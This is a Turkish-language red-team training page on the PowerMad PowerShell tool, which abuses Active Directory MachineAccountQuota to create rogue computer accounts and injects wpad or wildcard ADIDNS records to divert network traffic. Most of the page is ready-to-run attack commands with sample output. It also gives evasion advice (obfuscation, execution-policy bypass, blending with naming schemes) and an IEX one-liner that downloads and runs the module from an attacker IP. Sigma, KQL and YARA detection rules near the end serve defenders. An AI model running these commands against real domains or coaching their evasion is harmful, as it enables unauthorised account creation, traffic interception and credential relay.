# PowerMad

> **Kategori:** [9. ACL, GPO VE NESNE MANİPÜLASYONU (OBJECT, ACL & DELEGATION ABUSE)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Kevin Robertson (@Kevin_Robertson / NetSPI) tarafından geliştirilen; Active Directory'de standart etki alanı kullanıcılarına tanınan Makine Hesabı Kotası'nı (`MachineAccountQuota - MAQ`) kullanarak RSAT veya AD modülleri gerektirmeden saf .NET/LDAP ile yeni bilgisayar hesapları ekleyen, düzenleyen ve Active Directory Entegre DNS (ADIDNS) kayıtlarını dinamik olarak yöneten PowerShell sömürü modülü.

---

## 1. Genel Bakış ve Amaç

Active Directory etki alanlarında varsayılan yapılandırma gereği, etki alanı kök nesnesi (`DC=corp,DC=local`) üzerinde **`ms-DS-MachineAccountQuota` (MAQ)** özniteliği `10` olarak tanımlıdır. Bu değer, etki alanındaki en düşük yetkili herhangi bir standart kullanıcının (`Domain Users`), hiçbir yönetici onayına ihtiyaç duymadan etki alanına 10 adede kadar yeni bilgisayar hesabı (`Computer$`) ekleyebileceği anlamına gelir.

Bir kırmızı takım operasyonunda yeni bir bilgisayar hesabı oluşturabilmek şu kritik sömürü vektörlerinin temel taşıdır:
1. **Kaynak Tabanlı Kısıtlı Yetki Devri (RBCD):** Bir hedef sunucu üzerinde `GenericWrite` yetkisi olduğunda, o sunucunun `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine bir Service Principal Name (SPN) sahibi hesap eklenmelidir. Standart kullanıcılar kural olarak SPN tanımlayamazken, etki alanına eklenen bilgisayar hesapları otomatik olarak `HOST/<MakineAdı>` ve `RestrictedKrbHost/<MakineAdı>` SPN'lerine sahip olur.
2. **Shadow Credentials / KrbRelayUp:** Yeni makine hesabı, sahte kimlik doğrulama veya yetki aktarımında aracı atlama nesnesi olarak kullanılır.
3. **AD CS ESC8 Sömürüsü:** Coerced NTLM kimlik doğrulamasını web kayıt uçlarına iletmek veya makine sertifikaları talep etmek.
4. **ADIDNS Manipülasyonu:** Active Directory Integrated DNS üzerinde standart kullanıcıların yeni düğüm (Node) oluşturabilme hakkı sayesinde `wpad` veya joker karakter (`*`) DNS kayıtları ekleyerek ağ trafiğini ortadaki adam (MitM) saldırısıyla saldırgana yönlendirmek.

**`PowerMad`**, bu yetenekleri hiçbir harici bağımlılığa (RSAT araçları, ActiveDirectory PowerShell modülü vb.) ihtiyaç duymadan, doğrudan Windows'un yerleşik `.NET` Dizin Hizmetleri (`System.DirectoryServices.Protocols` ve `System.DirectoryServices.AccountManagement`) üzerinden gerçekleştiren hafif bir PowerShell modülüdür.

### Temel Çalışma Mekanizması

- **`New-MachineAccount`:** LDAP `ADD` isteği ile `CN=Computers` konteyneri altında `computer` nesnesi oluşturur. `userAccountControl` değerini `0x1000` (`WORKSTATION_TRUST_ACCOUNT`) olarak ayarlar ve makinenin parolasını belirler.
- **`Get-MachineAccountQuota`:** Etki alanı kökünden `ms-DS-MachineAccountQuota` değerini okur ve kullanıcının kotasını sorgular.
- **`New-ADIDNSNode`:** `CN=MicrosoftDNS,DC=DomainDnsZones,DC=domain,DC=local` veya `ForestDnsZones` konteynerine bağlanarak yeni bir `dnsNode` nesnesi ekler ve IP adresini `dnsRecord` ikili özniteliğine yazar.

### Mimari Akış Şeması

```
┌────────────────────────────────────────────────────────────────────────┐
│                   SALDIRGAN POWERSHELL OTURUMU (POWERMAD)              │
│                                                                        │
│  [ New-MachineAccount -MachineAccount "ATTACKPC" -Password "Pass123" ] │
│         │                                                              │
│         ├── (1) LDAP / LDAPS Bağlantısı Açılır (TCP 389/636)           │
│         │   └── Kimlik: Mevcut Düşük Yetkili Kullanıcı Oturumu         │
│         │                                                              │
│         ├── (2) ms-DS-MachineAccountQuota Denetimi Yapılır (Kota < 10) │
│         │                                                              │
│         ├── (3) LDAP ADD Request İletilir:                             │
│         │       dn: CN=ATTACKPC,CN=Computers,DC=corp,DC=local          │
│         │       objectClass: computer                                  │
│         │       sAMAccountName: ATTACKPC$                              │
│         │       userAccountControl: 4096 (WORKSTATION_TRUST_ACCOUNT)   │
│         │       unicodePwd: "Pass123"                                  │
│         │       servicePrincipalName: HOST/ATTACKPC.corp.local         │
│         │                                                              │
│         ▼                                                              │
│  [ DOMAIN CONTROLLER (NTDS.DIT) ] ──► Yeni Makine Hesabı Oluşturuldu   │
│         │                                                              │
│         ▼                                                              │
│  [ ÇIKTI: ATTACKPC$ Hesabı RBCD veya AD CS İçin Kullanıma Hazır! ]     │
│         │                                                              │
│  [ New-ADIDNSNode -Node "wpad" -Data "10.10.10.50" ]                  │
│         │                                                              │
│         └── (4) ADIDNS Kaydı Eklenir ──► Ağ Genelinde Trafik Saldırgana│
└────────────────────────────────────────────────────────────────────────┘
```

### Neden Önemli? Operasyonel Değer

| Operasyonel Senaryo | Yerleşik Windows Araçları (net.exe / RSAT) | PowerMad Yaklaşımı |
|---|---|---|
| **Yönetici Hakları İhtiyacı** | `net computer /add` yerel yönetici veya Domain Admin hakkı arar. | Standart `Domain Users` yetkisiyle MAQ üzerinden makine açar. |
| **RSAT Bağımlılığı** | `New-ADComputer` Active Directory modülü ve RSAT gerektirir. | Sıfır bağımlılık; saf .NET ve yerel PowerShell ile her makinede çalışır. |
| **ADIDNS Manipülasyonu** | DNS Manager GUI veya dnscmd aracı kısıtlıdır ve admin ister. | Dizin izinlerini kullanarak düşük yetkili kullanıcıyla DNS kaydı enjekte eder. |
| **Bellek İçi Yürütme** | Binary dosyaların diske indirilmesi gerekir. | Tek satırda IEX ile bellekten (In-Memory) doğrudan çağrılabilir. |

### Alternatif Araçlarla Karşılaştırma

| Özellik | PowerMad | impacket-addcomputer | bloodyAD | StandIn |
|---|---|---|---|---|
| **Geliştirme Dili** | PowerShell (.NET) | Python 3 | Python 3 | C# (.NET) |
| **Çalışma Platformu** | Windows (Yerel PowerShell) | Linux / Windows | Linux / Windows | Windows (Yerel Binary) |
| **ADIDNS Desteği** | 🟢 Tam Entegre (Node/Record) | 🔴 Yok | 🟡 Salt DNS Dökümü | 🔴 Yok |
| **RSAT Bağımsızlığı** | 🟢 Tamamen Bağımsız | 🟢 Bağımsız | 🟢 Bağımsız | 🟢 Bağımsız |
| **RBCD Entegrasyonu** | 🟡 Makine açar (RBCD'yi başka araç yapar)| 🟡 Yalnızca makine | 🟢 Hem makine hem RBCD | 🟢 Hem makine hem RBCD |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

PowerMad modülü içe aktarıldıktan sonra (`Import-Module .\Powermad.ps1`) bağımsız cmdlet'ler şeklinde kullanılır.

### Başlıca Cmdlet'ler

- **`New-MachineAccount`:** Etki alanına yeni bir bilgisayar hesabı ekler.
- **`Get-MachineAccountQuota`:** Etki alanı genelinde tanımlı MAQ değerini görüntüler.
- **`Set-MachineAccountAttribute`:** Oluşturulan makine hesabının özniteliklerini (SPN, UAC vb.) günceller.
- **`Disable-MachineAccount`:** Bilgisayar hesabını devre dışı bırakır.
- **`New-ADIDNSNode`:** Active Directory Integrated DNS konteynerine yeni bir DNS A/CNAME kaydı ekler.
- **`Remove-ADIDNSNode`:** Eklenen DNS kaydını temizler.

### `New-MachineAccount` Kritik Parametreleri

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-MachineAccount` | Oluşturulacak bilgisayar hesabının adı (Sonuna `$` koymaya gerek yoktur, otomatik eklenir). | `-MachineAccount "PWNPC01"` |
| `-Password` | Makine hesabına atanacak parola (Açık metin veya SecureString). | `-Password "ComplexPass#2026!"` |
| `-Domain` | Hedef Active Directory etki alanı adı. | `-Domain corp.local` |
| `-DomainController` | İşlemin gönderileceği Domain Controller FQDN veya IP adresi. | `-DomainController dc01.corp.local` |
| `-DistinguishedName` | Bilgisayar hesabının oluşturulacağı özel OU dizin yolu (Varsayılan: `CN=Computers`). | `-DistinguishedName "OU=Workstations,DC=corp,DC=local"` |
| `-Credential` | Farklı bir kullanıcı kimliğiyle bağlanmak için `PSCredential` nesnesi. | `-Credential $cred` |

### `New-ADIDNSNode` Kritik Parametreleri

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-Node` | Oluşturulacak DNS kaydının adı (Örn: `wpad`, `printer`, `*`). | `-Node "wpad"` |
| `-Data` | DNS kaydının yönlendirileceği hedef IP adresi. | `-Data "10.10.10.50"` |
| `-Zone` | Hedef DNS bölgesi (Varsayılan: etki alanı adı). | `-Zone "corp.local"` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: MAQ Değerini Sorgulama ve Yeni Bilgisayar Hesabı Açma

Mevcut kullanıcının makine hesabı oluşturma hakkı olup olmadığını doğrulamak ve yeni bir makine hesabı üretmek:

```powershell
Import-Module .\Powermad.ps1

# 1. Makine hesabı kotasını sorgula
Get-MachineAccountQuota -Domain corp.local

# 2. Yeni bir bilgisayar hesabı oluştur
New-MachineAccount -MachineAccount "FAKEMACHINE01" -Password "SecretMachinePass123!" -Domain corp.local -DomainController dc01.corp.local -Verbose
```

**Örnek Konsol Çıktısı Analizi:**

```text
PS C:\Tools> Get-MachineAccountQuota -Domain corp.local
10

PS C:\Tools> New-MachineAccount -MachineAccount "FAKEMACHINE01" -Password "SecretMachinePass123!" -Domain corp.local -DomainController dc01.corp.local -Verbose
VERBOSE: Connecting to LDAP server dc01.corp.local...
VERBOSE: Authenticated as current user context.
VERBOSE: Target container: CN=Computers,DC=corp,DC=local
VERBOSE: Constructing computer object attributes:
  sAMAccountName        : FAKEMACHINE01$
  userAccountControl    : 4096 (WORKSTATION_TRUST_ACCOUNT)
  servicePrincipalName  : HOST/FAKEMACHINE01, HOST/FAKEMACHINE01.corp.local
VERBOSE: Sending LDAP AddRequest...
[+] Successfully created machine account 'FAKEMACHINE01$' in 'CN=Computers,DC=corp,DC=local'!
```

*Çıktı Yorumu:* `ms-DS-MachineAccountQuota` değerinin 10 olduğu görülmüş ve standart kullanıcı yetkisiyle `FAKEMACHINE01$` bilgisayarı SPN'leriyle birlikte etki alanına eklenmiştir.

### Senaryo 2: RBCD Saldırısı İçin Makine Hesabı Hazırlama

Bir hedef sunucuyu devralmak üzere Resource-Based Constrained Delegation yapılandırmasında kullanılacak bir makine hesabı oluşturup SID değerini almak:

```powershell
# 1. Makine hesabını oluştur
New-MachineAccount -MachineAccount "RBCDMACHINE" -Password "RbcdPass2026!" -Domain corp.local

# 2. Makine hesabının nesne SID'sini doğrula
([adsi]"LDAP://CN=RBCDMACHINE,CN=Computers,DC=corp,DC=local").objectsid
```

Elde edilen bu makine hesabı, hedef sunucunun `msDS-AllowedToActOnBehalfOfOtherIdentity` özniteliğine yazılır ve ardından S4U2self/S4U2proxy ile Domain Admin taklidi yapılır.

### Senaryo 3: ADIDNS Üzerinden WPAD Kaydı ile Ağ Trafiği Zehirleme (MitM)

Ağdaki Web Proxy Auto-Discovery (WPAD) isteklerini saldırganın dinleyici makinesine çekmek için etki alanı DNS sunucusuna yeni bir düğüm enjekte etmek:

```powershell
New-ADIDNSNode -Node "wpad" -Data "10.10.10.50" -Zone "corp.local" -Verbose
```

Bu komuttan sonra ağdaki tarayıcılar proxy ayarlarını ararken `wpad.corp.local` sorgusu yapacak, yanıt olarak `10.10.10.50` (Responder veya NTLM relay makinesi) dönecek ve tüm HTTP/NTLM kimlik doğrulama istekleri saldırgana akacaktır.

### Senaryo 4: Joker Karakter (Wildcard) DNS Kaydı ile Tüm Çözümlenemeyen Trafiği Ele Geçirme

Etki alanında çözümlenemeyen tüm DNS sorgularını (LLMNR/NBT-NS benzeri) merkezi olarak kendi IP'mize yönlendirmek:

```powershell
New-ADIDNSNode -Node "*" -Data "10.10.10.50" -Zone "corp.local"
```

### Senaryo 5: Özel Bir OU Konteyneri Altında Makine Hesabı Oluşturma

Sistem yöneticilerinin dikkatini çekmemek için varsayılan `CN=Computers` yerine kurumsal bir çalışma istasyonu OU'su altında gizlenmek:

```powershell
New-MachineAccount -MachineAccount "PC-SALES-99" -Password "PwnPass123!" -DistinguishedName "OU=Laptops,OU=Devices,DC=corp,DC=local"
```

### Senaryo 6: Operasyon Sonrası Eklenen Bilgisayar Hesabını Devre Dışı Bırakma (Temizlik)

Sızma testi bittikten sonra oluşturulan hesabın kötüye kullanılmasını önlemek için hesabı pasife çekmek:

```powershell
Disable-MachineAccount -MachineAccount "FAKEMACHINE01" -Domain corp.local
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Kod | Temel Neden | Kesin Çözüm Adımı |
|---|---|---|
| `MACHINE_ACCOUNT_QUOTA_EXCEEDED (0x80072035) / 0000216D` | Mevcut kullanıcı daha önce 10 adet bilgisayar hesabı oluşturmuş ve kotasını doldurmuştur (`ms-DS-MachineAccountQuota` aşılmıştır). | Farklı bir ele geçirilmiş etki alanı kullanıcısına geçilmeli veya daha önce oluşturulup kullanılmayan bir makine hesabı geri dönüştürülmelidir. |
| `MachineAccountQuota is 0 (Disabled)` | Kurum güvenlik sıkılaştırması (hardening) kapsamında etki alanı yöneticileri `ms-DS-MachineAccountQuota` değerini `0` olarak ayarlamıştır; standart kullanıcılar makine açamaz. | Standart kullanıcıyla makine hesabı açılamaz. Ortamda önceden ele geçirilmiş mevcut bir bilgisayar hesabı token'ı (`SYSTEM` oturumu) kullanılmalı veya yetki yükseltilmelidir. |
| `CONSTRAINT_VIOLATION (0x13) / Password policy violation` | `-Password` parametresine verilen parola, etki alanının asgari parola uzunluğu veya karmaşıklık kurallarına uymamaktadır. | Çok daha uzun (16+ karakter), büyük harf, rakam ve sembol içeren karmaşık bir parola tanımlanmalıdır. |
| `INSUFFICIENT_ACCESS_RIGHTS (0x32) on New-ADIDNSNode` | Saldırganın hedef DNS bölgesinde (`DomainDnsZones`) yeni nesne oluşturma (`CreateChild`) hakkı kısıtlanmıştır veya `wpad` kaydı önceden mevcuttur. | `wpad` kaydı zaten varsa başkası tarafından oluşturulmuş olabilir; alternatif olarak rastgele veya wildcard (`*`) kayıt açılmalı ya da DACL izinleri incelenmelidir. |
| `Script execution is disabled on this system (ExecutionPolicy)` | Windows PowerShell betik yürütme politikası `Restricted` seviyesindedir. | Komut satırında bypass uygulanmalıdır: `powershell -ExecutionPolicy Bypass -NoProfile` veya modül kodu doğrudan belleğe yüklenmelidir (`IEX`). |
| `LdapException: The LDAP server is unavailable` | Domain Controller'ın 389 veya 636 portuna erişilememektedir. | `-DomainController` bayrağı ile doğrudan erişilebilir bir DC IP'si veya FQDN adı verilmelidir. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
┌────────────────────────────────────────────────────────────────────────┐
│                        GÜRÜLTÜ VE İZ SEVİYESİ                          │
│                                                                        │
│  [ Ağ Portları ]     : 🟢 MİNİMAL (Yalnızca LDAP TCP 389 veya 636)     │
│  [ DC Logları ]      : 🔴 YÜKSEK (Event 4741 Makine Oluşturma Günlüğü)│
│  [ DNS Telemetrisi ] : 🟡 ORTA (Event 5136 ADIDNS Düğüm Değişikliği)   │
│  [ PowerShell İzi ]  : 🔴 YÜKSEK (Script Block Logging Event 4104)    │
└────────────────────────────────────────────────────────────────────────┘
```

### 5.1 Bırakılan İzler (Artifacts & Telemetry)

1. **Domain Controller Güvenlik Günlükleri (Security Log):**
   - **Event ID 4741 (A computer account was created):**
     - `SubjectUserName`: Makineyi oluşturan standart kullanıcının adı (Örn: `jdoe`).
     - `TargetUserName`: Yeni oluşturulan makine hesabı adı (`FAKEMACHINE01$`).
     - **Kritik Alarm Kuralı:** `SubjectUserName` alanında bir Domain Admin veya yetkili hesap yerine `Domain Users` grubundan standart bir kullanıcının yer alması, ortamda %99 ihtimalle PowerMad, impacket-addcomputer veya benzeri bir MAQ sömürüsünün çalıştığını gösterir.
   - **Event ID 4742 (A computer account was changed):** SPN veya UAC bayrakları güncellendiğinde oluşur.
2. **Dizin Hizmeti Değişiklik Günlükleri (ADIDNS):**
   - **Event ID 5136:** `CN=MicrosoftDNS,DC=DomainDnsZones,...` altında yeni bir `dnsNode` eklendiğinde tetiklenir.
3. **PowerShell Script Block Logging:**
   - **Event ID 4104:** `New-MachineAccount`, `Powermad`, `ms-DS-MachineAccountQuota` fonksiyon ve anahtar kelimeleri PowerShell operasyonel loglarına açık metin kaydedilir.

### 5.2 Ağ ve EDR İmzaları

- **Ağ Tespiti:** LDAP paketinde `objectClass: computer` içeren bir `AddRequest` paketinin standart kullanıcı oturumuyla gönderilmesi.
- **DNS Zehirleme Tespiti:** DNS sunucusuna aniden `wpad` veya `*` A kaydı eklenmesi kurumsal SIEM kuralları tarafından anında yakalanabilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araç İçindeki Kullanım |
|---|---|---|
| **T1136.002** | Create Account: Domain Account | MAQ kotası kullanılarak yetkisiz bilgisayar hesabı oluşturulması. |
| **T1557** | Adversary-in-the-Middle | ADIDNS manipülasyonu ile ağ trafiğinin saldırgana saptırılması. |
| **T1098** | Account Manipulation | Bilgisayar hesabı özniteliklerinin (SPN vb.) düzenlenmesi. |
| **T1078.002** | Valid Accounts: Domain Accounts | Oluşturulan makine hesabı üzerinden Kerberos biletleri türetilmesi. |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Güvenli Operasyon Pratiği |
|---|---|
| **Standart Kullanıcı ile Event 4741** | SIEM kuralları standart kullanıcının makine açmasını anında alarm olarak yakalar. Bu nedenle hesabı mesai saatlerinde ve meşru bir yardım masası hesabı üzerinden açmaya çalışın. |
| **Göz Çarpıcı Makine Adları** | `ATTACKPC`, `PWNPC` gibi isimler vermeyin; kurumun standart isimlendirme şablonuna (Örn: `IST-WKS-8419`) uyun. |
| **PowerShell Log Tespiti** | PowerShell betiğini diske indirmeyin; fonksiyon adlarını ve değişkenleri karıştırın (obfuscate edin) veya Linux üzerinden [impacket-addcomputer](./impacket-addcomputer.md) kullanın. |
| **Artık Makine Hesapları** | Test bittikten sonra oluşturulan hesapları mutlaka silin veya devre dışı bırakın; etki alanında sahipsiz makine hesabı bırakmayın. |

### 5.5 Savunma Karşılığı: Tespit Kuralları

#### Sigma Kuralı: Standart Kullanıcı Tarafından Bilgisayar Hesabı Oluşturulması Tespiti

```yaml
title: Computer Account Created by Non-Privileged User
id: a71239b1-4812-4c20-a912-38910245fe01
status: experimental
description: Detects the creation of a computer account (Event 4741) by an unprivileged user utilizing MachineAccountQuota.
author: Modul 11 Security Research
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4741
  filter_privileged:
    SubjectUserName|endswith: '$' # Makine hesapları
    SubjectUserName|contains:
      - 'admin'
      - 'svc_'
      - 'da_'
  condition: selection and not filter_privileged
falsepositives:
  - Legitimate self-service domain join workflows or Intune provisioning accounts
level: high
tags:
  - attack.persistence
  - attack.t1136.002
```

#### Microsoft Sentinel KQL Sorgusu: Standart Kullanıcı Makine Oluşturma Korelasyonu

```kql
// Event 4741 olayında makine oluşturan kullanıcının Domain Admin olmadığını doğrulayan sorgu
SecurityEvent
| where TimeGenerated > ago(2h)
| where EventID == 4741
| extend EventDataXML = parse_xml(EventData)
| extend Creator = tostring(EventDataXML.EventData.Data[4])
| extend NewComputer = tostring(EventDataXML.EventData.Data[0])
| where not(Creator endswith "$" or Creator has_any ("Administrator", "da_", "admin"))
| project TimeGenerated, Computer, Creator, NewComputer, IpAddress
```

#### YARA Kuralı: PowerMad PowerShell Modülü ve Cmdlet İmzaları

```yara
rule PostExploit_PowerMad_Module {
    meta:
        description = "Detects PowerMad Active Directory MachineAccountQuota exploitation script"
        author = "Active Directory Red Team Module 11"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "New-MachineAccount" ascii wide nocase
        $s2 = "Get-MachineAccountQuota" ascii wide nocase
        $s3 = "New-ADIDNSNode" ascii wide nocase
        $s4 = "WORKSTATION_TRUST_ACCOUNT" ascii wide nocase
        $s5 = "ms-DS-MachineAccountQuota" ascii wide nocase
        $s6 = "Kevin Robertson" ascii wide nocase
    condition:
        all of ($s1, $s2) or (3 of ($s1, $s3, $s4, $s5, $s6))
}
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Etki Alanı Makine Kotasını (MAQ) Kontrol Etme
```powershell
Get-MachineAccountQuota -Domain corp.local
```
- **Ne Yapar?** Etki alanı kök nesnesindeki `ms-DS-MachineAccountQuota` değerini okur ve ekrana basar.
- **Ne Zaman Kullanılır?** Makine hesabı oluşturmadan önce ortamda bu hakkın açık (varsayılan 10) olup olmadığını doğrulamak için.
- **Parametreler:** `-Domain`: Hedef etki alanı adı.

### Komut 2: Yeni Bilgisayar Hesabı Oluşturma
```powershell
New-MachineAccount -MachineAccount "WKS-DEV-01" -Password "ComplexPass#2026!" -Domain corp.local
```
- **Ne Yapar?** Standart kullanıcı yetkisiyle `WKS-DEV-01$` adında yeni bir etki alanı bilgisayar hesabı oluşturur.
- **Ne Zaman Kullanılır?** RBCD, Shadow Credentials veya sertifika sömürülerinde SPN sahibi bir aracı makine gerektiğinde.
- **Parametreler:** `-MachineAccount`: Bilgisayar adı, `-Password`: Makine parolası.

### Komut 3: ADIDNS Üzerinde WPAD Kaydı Oluşturma (Trafik Zehirleme)
```powershell
New-ADIDNSNode -Node "wpad" -Data "10.10.10.50" -Zone "corp.local"
```
- **Ne Yapar?** Kurumsal DNS sunucusuna `wpad.corp.local` A kaydı ekleyerek IP'yi saldırgan makinesine yönlendirir.
- **Ne Zaman Kullanılır?** Ağdaki tarayıcıların proxy kimlik doğrulama isteklerini dinlemek ve relay etmek için.
- **Parametreler:** `-Node`: Kayıt adı ("wpad"), `-Data`: Saldırgan IP'si.

### Komut 4: Joker Karakter (Wildcard) DNS Kaydı Enjeksiyonu
```powershell
New-ADIDNSNode -Node "*" -Data "10.10.10.50" -Zone "corp.local"
```
- **Ne Yapar?** Etki alanında var olmayan tüm alan adı sorgularını saldırganın IP adresine yönlendirir.
- **Ne Zaman Kullanılır?** Ağ genelinde çözümlenemeyen tüm iç ağ trafiğini pasif olarak toplamak ve NTLM yakalamak için.
- **Parametreler:** `-Node "*"`: Joker karakter kaydı.

### Komut 5: Belirli Bir OU Altında Bilgisayar Hesabı Açma
```powershell
New-MachineAccount -MachineAccount "LPT-SALES-12" -Password "SecretPass!" -DistinguishedName "OU=Laptops,DC=corp,DC=local"
```
- **Ne Yapar?** Makine hesabını varsayılan `CN=Computers` yerine belirtilen kurumsal OU içine oluşturur.
- **Ne Zaman Kullanılır?** Sistem yöneticilerinin dikkatini çekmemek ve normal kullanıcı cihazı gibi görünmek için.
- **Parametreler:** `-DistinguishedName`: Hedef OU konteyneri yolu.

### Komut 6: Eklenen ADIDNS Kaydını Güvenle Silme (Temizlik)
```powershell
Remove-ADIDNSNode -Node "wpad" -Zone "corp.local"
```
- **Ne Yapar?** Daha önce eklenen sahte DNS kaydını DNS sunucusundan kaldırır.
- **Ne Zaman Kullanılır?** Test bittiğinde ağ trafiğinin normale dönmesini sağlamak için.
- **Parametreler:** `-Node`: Silinecek kayıt adı.

### Komut 7: Makine Hesabını Devre Dışı Bırakma
```powershell
Disable-MachineAccount -MachineAccount "WKS-DEV-01" -Domain corp.local
```
- **Ne Yapar?** Bilgisayar hesabının UAC özniteliğine `ACCOUNTDISABLE` bayrağını ekleyerek hesabı kilitler.
- **Ne Zaman Kullanılır?** Sömürü tamamlandığında hesabın başkaları tarafından kullanılmasını engellemek için.
- **Parametreler:** `-MachineAccount`: Kapatılacak makine adı.

### Komut 8: Farklı Kimlik Bilgisi ile Makine Hesabı Açma
```powershell
$cred = Get-Credential
New-MachineAccount -MachineAccount "SRV-TEST-99" -Password "Pass123!" -Credential $cred
```
- **Ne Yapar?** Mevcut Windows oturumu yerine belirtilen PSCredential kimliğini kullanarak LDAP üzerinden makine açar.
- **Ne Zaman Kullanılır?** Farklı bir domain kullanıcısının haklarıyla çalışırken.
- **Parametreler:** `-Credential`: Kimlik nesnesi.

### Komut 9: Makine Hesabının SPN Değerlerini Güncelleme
```powershell
Set-MachineAccountAttribute -MachineAccount "WKS-DEV-01" -Attribute "servicePrincipalName" -Value "MSSQLSvc/dev01.corp.local"
```
- **Ne Yapar?** Oluşturulan makine hesabına özel bir Service Principal Name ekler.
- **Ne Zaman Kullanılır?** Kerberoasting veya özel servis delegasyonları hazırlarken.
- **Parametreler:** `-Attribute`: Öznitelik adı, `-Value`: Yeni değer.

### Komut 10: PowerShell IEX ile Bellekten Doğrudan Çalıştırma
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.50/Powermad.ps1'); New-MachineAccount -MachineAccount "INMEM01" -Password "Pass123!"
```
- **Ne Yapar?** PowerMad modülünü diske indirmeden doğrudan bellek içinde yürütür ve makine hesabını açar.
- **Ne Zaman Kullanılır?** Dosya sistemi izlenen ortamlarda disk I/O izi bırakmamak için.
- **Parametreler:** `IEX`: Invoke-Expression hafıza içi yükleme.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Kevin-Robertson / Powermad](https://github.com/Kevin-Robertson/Powermad)
- **NetSPI Araştırma Blogu:** [Exploiting MachineAccountQuota and ADIDNS](https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/)
- **Microsoft Dokümantasyonu:** [ms-DS-MachineAccountQuota attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)
- **MITRE ATT&CK Referansı:** [T1136.002 - Create Account: Domain Account](https://attack.mitre.org/techniques/T1136/002/)

---

> **Önceki:** [← pyGPOAbuse](./pyGPOAbuse.md) · **Sonraki:** [impacket-rbcd →](./impacket-rbcd.md)
